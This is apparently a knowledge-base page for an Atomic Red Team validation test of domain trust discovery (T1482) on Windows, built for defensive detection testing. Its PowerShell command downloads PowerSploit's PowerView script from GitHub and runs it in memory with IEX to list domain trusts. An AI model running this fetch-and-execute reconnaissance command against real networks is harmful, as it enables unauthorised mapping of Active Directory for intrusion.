---
atomic_guid: "f974894c-5991-4b19-aaf5-7cc2fe298c5d"
title: "Get-DomainTrust with PowerView"
framework: "atomic"
generated: "true"
attack_technique_id: "T1482"
attack_technique_name: "Domain Trust Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "f974894c-5991-4b19-aaf5-7cc2fe298c5d"
  - "Get-DomainTrust with PowerView"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Get-DomainTrust with PowerView

Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.

## Metadata

- Atomic GUID: f974894c-5991-4b19-aaf5-7cc2fe298c5d
- Technique: T1482: Domain Trust Discovery
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1482/T1482.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1482-domain_trust_discovery|T1482]]

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1482/T1482.yaml)
